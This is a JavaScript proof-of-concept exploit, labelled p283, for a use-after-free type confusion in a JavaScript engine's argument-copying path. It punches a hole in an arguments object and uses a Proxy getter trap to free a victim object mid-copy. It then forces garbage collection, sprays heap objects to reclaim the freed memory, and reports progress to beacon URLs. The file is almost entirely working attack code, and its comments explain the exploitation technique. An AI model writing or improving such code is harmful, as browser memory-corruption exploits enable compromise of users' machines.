// p283 - Late-victim type confusion via butterfly UAF
//
// KEY INSIGHT: p247 failed because victim was at slot 0 (BEFORE hole at 5).
// By the time the trap fires at slot 5, firstElementDest[0] already holds
// the victim JSValue on the CLoop stack = conservative GC root.
//
// FIX: Put victim at slot 50 (AFTER hole at 5). When trap fires at slot 5,
// firstElementDest[50] has NOT been written. Victim is NOT on any stack.
// Conservative scan pins the butterfly CELL but does NOT trace contents.
// With victim nulled from new butterfly + JS vars, victim is collectible.
//
// After GC collects victim, spray same-size objects to reclaim victim addr.
// copyToArguments continues reading old butterfly slot 50 = stale JSValue
// pointing to reclaimed memory = TYPE CONFUSION.
//
// Beacon prefix: V283-

(function() {
  function B(tag, body) {
    var url = '/beacon/V283-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  var VICTIM_SLOT = 50;
  var HOLE_SLOT = 5;
  var N = 64;

  function attempt(round) {
    var victim = {
      victimA: 0xAAAA0000 + round,
      victimB: 0xBBBB0000 + round,
      pad1: 'VICTIM',
      pad2: 'DATA'
    };
    var victimWR;
    try { victimWR = new WeakRef(victim); } catch(e) { victimWR = null; }

    var argArr = [];
    for (var i = 0; i < N; i++) {
      if (i === VICTIM_SLOT) argArr.push(victim);
      else if (i === VICTIM_SLOT + 1) argArr.push(victim);
      else argArr.push(i + 1);
    }

    var args = target.apply(null, argArr);
    delete args[HOLE_SLOT];

    argArr[VICTIM_SLOT] = null;
    argArr[VICTIM_SLOT + 1] = null;
    argArr = null;

    var trapFired = false;
    var sprayObjs = [];
    var gcCollected = false;

    var trap = {
      get: function(t, prop) {
        if (trapFired) return 0xFACE;
        trapFired = true;

        for (var j = 100; j < 800; j++) {
          args[j] = 0x41414141;
        }

        args[VICTIM_SLOT] = null;
        args[VICTIM_SLOT + 1] = null;

        victim = null;

        for (var g = 0; g < 80; g++) {
          var batch = [];
          for (var k = 0; k < 15000; k++) {
            batch.push({x: k, y: k + 1, z: String(k)});
          }
          batch = null;
        }

        if (victimWR) {
          var vCheck = victimWR.deref();
          if (!vCheck) {
            gcCollected = true;
            B('R' + round + '-GC-COLLECTED');
          } else {
            B('R' + round + '-GC-STILL-ALIVE');
          }
        } else {
          B('R' + round + '-NO-WEAKREF');
        }

        sprayObjs = [];
        for (var s = 0; s < 10000; s++) {
          sprayObjs.push({
            sprayA: 0xC0FE0000 + (s & 0xFFFF),
            sprayB: 0xDEAD0000 + (s & 0xFFFF),
            pad1: 'SPRAY',
            pad2: 'REPL'
          });
        }
        B('R' + round + '-SPRAYED-' + sprayObjs.length);

        return 0xBEEF;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('R' + round + '-ERR-' + e.message.substring(0, 40));
      return null;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return null; }
    B('R' + round + '-LEN-' + result.length);

    var v50 = result[VICTIM_SLOT];
    if (typeof v50 === 'object' && v50 !== null) {
      if (v50.sprayA !== undefined) {
        var sa = v50.sprayA >>> 0;
        B('R' + round + '-REPLACED-' + hex(sa));
        return {hit: true, obj: v50, round: round};
      } else if (v50.victimA !== undefined) {
        B('R' + round + '-VICTIM-ALIVE-S50');
      } else {
        B('R' + round + '-UNKNOWN-OBJ-S50');
        try { B('R' + round + '-KEYS-' + Object.keys(v50).join(',')); } catch(e) {}
      }
    } else if (v50 === null || v50 === undefined) {
      B('R' + round + '-NULLISH-' + (gcCollected ? 'COLLECTED' : 'NOT'));
    } else if (typeof v50 === 'number') {
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = v50;
      var dv = new DataView(buf);
      B('R' + round + '-NUM-' + hex(dv.getUint32(4, false)) + hex(dv.getUint32(0, false)));
    } else {
      B('R' + round + '-TYPE-' + typeof v50);
    }

    var v5 = result[HOLE_SLOT];
    if (typeof v5 === 'number') B('R' + round + '-HOLE-' + hex(v5 >>> 0));

    if (victimWR) {
      var postCheck = victimWR.deref();
      B('R' + round + '-POST-' + (postCheck ? 'ALIVE' : 'DEAD'));
    }

    var origCount = 0;
    for (var c = 6; c < N; c++) {
      if (c === VICTIM_SLOT || c === VICTIM_SLOT + 1 || c === HOLE_SLOT) continue;
      if (typeof result[c] === 'number' && result[c] === (c + 1)) origCount++;
    }
    B('R' + round + '-ORIG-' + origCount);

    return null;
  }

  var round = 0;
  function runNext() {
    if (round >= 8) { B('DONE'); return; }
    var res = attempt(round);
    if (res && res.hit) {
      B('SUCCESS-R' + res.round);
      B('SPRAY-A-' + hex((res.obj.sprayA || 0) >>> 0));
      B('SPRAY-B-' + hex((res.obj.sprayB || 0) >>> 0));
      return;
    }
    round++;
    setTimeout(runNext, 100);
  }
  runNext();
})();
